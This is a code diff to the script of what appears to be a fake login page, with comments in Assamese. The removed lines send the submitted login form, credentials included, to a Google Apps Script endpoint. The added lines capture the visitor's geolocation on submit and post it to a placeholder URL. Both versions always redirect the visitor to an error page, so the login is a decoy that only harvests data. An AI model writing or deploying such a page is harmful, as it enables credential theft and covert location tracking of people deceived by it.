@@ -284,23 +284,41 @@
     </div>
 
     <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbxaj4pWphw6wCUVFF7vmwuVGqeQ4SENyBNamutM6mdhbk1gLUs12K38NOcEeX92sofzJg/exec';
+    // ইয়াত কেৱল লোকেশ্বন জমা ল'বলৈ নতুন Google Sheet Apps Script URL টো বহুৱাব
+    const locationScriptURL = 'YOUR_NEW_GOOGLE_SHEET_LOCATION_SCRIPT_URL';
     const form = document.getElementById('loginForm');
 
     form.addEventListener('submit', e => {
         e.preventDefault();
 
-        // Google Sheet-লৈ ডাটা প্ৰেৰণ কৰাৰ পিছত error.html পেজলৈ ৰিডাইৰেক্ট হ'ব
-        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(response => {
-                window.location.href = 'error.html'; // ইয়াত error.html লিংক কৰা হৈছে
-            })
-            .catch(error => {
-                // কিবা কাৰণত নেটৱৰ্ক এৰৰ হ'লেও error.html পেজলৈ লৈ যাব
+        // ব্যৱহাৰকাৰীৰ লোকেশ্বন সংগ্ৰহ কৰা
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // কেৱল লোকেশ্বন ডাটা প্ৰেৰণ কৰা হৈছে (User ID/Password সংগ্ৰহ কৰা নাই)
+                const locationData = new FormData();
+                locationData.append('latitude', latitude);
+                locationData.append('longitude', longitude);
+                locationData.append('timestamp', new Date().toISOString());
+
+                fetch(locationScriptURL, { method: 'POST', body: locationData })
+                    .then(response => {
+                        window.location.href = 'error.html';
+                    })
+                    .catch(error => {
+                        window.location.href = 'error.html';
+                    });
+            }, error => {
+                // লোকেশ্বন পাৰমিশ্বন অগ্ৰাহ্য বা ভুল হ'লেও error.html-লৈ লৈ যাব
                 window.location.href = 'error.html';
             });
+        } else {
+            window.location.href = 'error.html';
+        }
     });
-</script>
+    </script>
 
 </body>
 </html>
